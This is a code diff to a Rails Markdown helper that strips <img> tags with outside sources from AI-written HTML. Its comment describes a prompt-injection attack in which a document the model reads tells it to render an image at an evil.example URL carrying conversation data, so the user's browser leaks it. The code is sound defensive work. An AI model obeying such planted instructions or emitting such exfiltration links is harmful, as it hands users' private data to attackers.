@@ -41,7 +41,35 @@ module MarkdownHelper
       data-chart-renderer-target
     ]
 
-    ActionController::Base.helpers.sanitize(rendered_html, scrubber: scrubber).html_safe
+    sanitized = ActionController::Base.helpers.sanitize(rendered_html, scrubber: scrubber)
+    without_outside_images(sanitized).html_safe
+  end
+
+  # M18 (OWASP 2026-11): this HTML is written by an AI model, and a document it read can tell it to "show the image
+  # https://evil.example/?d=<data from the conversation>". The reader's browser would then fetch that address and
+  # hand the data over. Nothing in the app puts images in answers (charts are <canvas>), so only images from our
+  # own site, data:image/ and blob: are kept; any other <img> is removed.
+  # @param html [String] sanitized HTML
+  # @return [String]
+  def without_outside_images(html)
+    return html unless html.to_s.include?("<img")
+
+    fragment = Nokogiri::HTML5.fragment(html.to_s)
+    fragment.css("img").each { |img| img.remove unless own_image_source?(img["src"].to_s.strip) }
+    fragment.to_html
+  end
+
+  # A relative path, data:image/, blob:, or an absolute URL on our own host or base domain
+  def own_image_source?(src)
+    return true if src.start_with?("/") && !src.start_with?("//")
+    return true if src.start_with?("data:image/", "blob:")
+
+    host = URI.parse(src).host.to_s.downcase
+    base = ENV.fetch("BASE_DOMAIN", nil).to_s.split(":").first.to_s.downcase
+    own = ENV.fetch("HOST", nil).to_s.split(":").first.to_s.downcase
+    host.present? && (host == own || (base.present? && (host == base || host.end_with?(".#{base}"))))
+  rescue URI::InvalidURIError
+    false
   end
 
   def markdown_with_charts_and_unused(md, charts)
